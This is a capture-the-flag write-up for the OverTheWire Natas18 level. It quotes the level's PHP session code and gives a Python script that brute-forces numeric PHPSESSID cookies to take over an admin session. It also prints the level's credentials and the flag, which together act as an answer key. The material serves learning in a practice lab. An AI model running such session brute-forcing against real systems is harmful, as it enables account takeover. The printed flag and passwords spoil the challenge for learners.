# CTF Writeup - **OverTheWire Natas17 - Natas18**

**Author**: spiketyson 

---

## Challenge Details

- **Challenge Name:** Natas17 - Natas18
- **Category:** Linux
- **Difficulty Level:** Easy
- **Date:** 18-12-2024

---

## Summary

This challenge is the introductory level for the Natas series on OverTheWire, focusing on web exploitation. The goal is to find the flag that is hidden web server using burpsuite if possible.

---

## Approach

Since this is an basic challenge, I planned to use python to find the flag using session brute force.

---

## Solution Walkthrough

Connecting to the web server using:

```bash
Username: natas18
Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
URL:      http://natas18.natas.labs.overthewire.org
```

After logging in, we can see that the webpage asks for an input username and password.  But we dont know anything about it, So lets input some random names and check it out. 

```bash
Please login with your admin account to retrieve credentials for natas19.
Username: natas
password: natas 
# You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.
```

Now we see that it doesnot check out input and only prints the above. This is interesting. Lets view the source code.

```bash
# <?php

# $maxid = 640; // 640 should be enough for everyone

# function isValidAdminLogin() { /* {{{ */
#     if($_REQUEST["username"] == "admin") {
#     /* This method of authentication appears to be unsafe and has been disabled for now. */
#         //return 1;
#     }

#     return 0;
# }
# /* }}} */
# function isValidID($id) { /* {{{ */
#     return is_numeric($id);
# }
# /* }}} */
# function createID($user) { /* {{{ */
#     global $maxid;
#     return rand(1, $maxid);
# }
# /* }}} */
# function debug($msg) { /* {{{ */
#     if(array_key_exists("debug", $_GET)) {
#         print "DEBUG: $msg<br>";
#     }
# }
# /* }}} */
# function my_session_start() { /* {{{ */
#     if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
#     if(!session_start()) {
#         debug("Session start failed");
#         return false;
#     } else {
#         debug("Session start ok");
#         if(!array_key_exists("admin", $_SESSION)) {
#         debug("Session was old: admin flag set");
#         $_SESSION["admin"] = 0; // backwards compatible, secure
#         }
#         return true;
#     }
#     }

#     return false;
# }
# /* }}} */
# function print_credentials() { /* {{{ */
#     if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
#     print "You are an admin. The credentials for the next level are:<br>";
#     print "<pre>Username: natas19\n";
#     print "Password: <censored></pre>";
#     } else {
#     print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
#     }
# }
# /* }}} */

# $showform = true;
# if(my_session_start()) {
#     print_credentials();
#     $showform = false;
# } else {
#     if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
#     session_id(createID($_REQUEST["username"]));
#     session_start();
#     $_SESSION["admin"] = isValidAdminLogin();
#     debug("New session started");
#     $showform = false;
#     print_credentials();
#     }
# }

# if($showform) {
# ?>
```

We can see that there is a small piece of code that is executed when we click on submit. This PHP script manages a session-based authentication system with debug functionality, allowing users to log in and retrieve credentials if they have administrative privileges. The script starts by validating sessions through `my_session_start()`, which checks for a valid numeric `PHPSESSID` cookie and initializes the `admin` flag in the session if it does not exist. If no valid session exists, and the user submits a `username` and `password`, a session is created with a random ID generated by `createID()`, but the admin flag is always set to `0` because the `isValidAdminLogin()` function (which checks if the username is "admin") is commented out and disabled. The `debug()` function outputs messages when the debug parameter is present in the URL, aiding in troubleshooting. The `print_credentials()` function displays the next level's credentials only if the session's admin flag is set to 1, otherwise informing the user they are logged in as a regular user. The script concludes by displaying credentials for `admin` users or informing non-admins of their status. However, the session ID generation is predictable, and the disabled admin login check highlights vulnerabilities that could be exploited for session hijacking or bypassing authentication.


```bash
import requests

target = 'http://natas18.natas.labs.overthewire.org'
auth = ('natas18','6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')
params = dict(username='admin', password='s3cr3t')
cookies = dict()

max_s_id = 640
s_id = 1
while s_id <= max_s_id:
	print ("Trying with PHPSESSID = " + str(s_id))
	cookies = dict(PHPSESSID=str(s_id))
	r = requests.get(target, auth=auth, params=params, cookies=cookies)
	if "You are an admin" in r.text:
		print(r.text)
		break
	s_id += 1
```

What we are doing here is that we are essentially we are trying out all possible `PHPSESSIONID` as `640` is a very small range. We can see that the password is displayed when the `PHPSESSIONID  = 119` as shwon below. 

```bash
# Trying with PHPSESSID = 1
# Trying with PHPSESSID = 2
# ...
# ...
# Trying with PHPSESSID = 118
# Trying with PHPSESSID = 119
# <html>
# <head>
# <!-- This stuff in the header has nothing to do with the level -->
# <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
# <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
# <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
# <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
# <script>var wechallinfo = { "level": "natas18", "pass": "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" };</script></head>
# <body>
# <h1>natas18</h1>
# <div id="content">
# You are an admin. The credentials for the next level are:<br><pre>Username: natas19
# Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>
```


## Flag

**Flag:** tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr


---

## Lessons Learned

It was a bit of challenge for me. I was able to grasp the idead behind the solution very easily. I learnt a lot on how to approach these types of challenges.